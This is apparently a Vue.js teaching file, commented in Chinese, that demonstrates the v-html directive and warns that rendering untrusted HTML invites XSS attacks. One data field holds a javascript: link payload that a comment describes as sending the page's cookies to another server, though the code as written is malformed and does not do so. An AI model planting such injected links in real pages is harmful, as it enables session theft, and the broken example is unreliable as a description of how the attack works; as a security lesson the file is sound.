<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html</title>
    <script src="../vue_js/vue.js"></script>
</head>
<body>
    <!-- 
        v-html指令：
            1.作用：向指定节点中渲染包含html结构的内容。
            2,与插值语法的区别：
                (1).v-htm1会替换掉节点中所有的内容，({xx}}则不会。
                (2).v-html可以识别html结构。
            3.严重注意：v-html有安全性问题！！！！
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                (2).一定要在可信的内容上使用v-htm1,永不要用在用户提交的内容上！
     -->
    <div id="root">
        <h2> {{name}} </h2>
        <!-- v-html支持HTML结构的解析,如果检测到数据中HTML会把内容替换为HTML结构 -->
        <!-- 但是会有数据危险性,可能会被别人篡改 -->
        <!-- 可以通过所在htmlOnly设置为只允许http请求读取 -->
        <div v-html="html"></div>
        <div v-html="lust"></div>
    </div>
</body>
<script>
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            name:"阴阳师",
            html:`<h2>hello,html</h2>`,
            //这样可以向别人服务器发送当前所在网页的所有cookie
            lust:"<a href=javascript:location.href='http://127.0.0.1:5500/vue_basic/15_%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/1.v-text%E6%8C%87%E4%BB%A4.html?+docment.location'>这里有你想要的</a>"
       }
    });
</script>
</html>
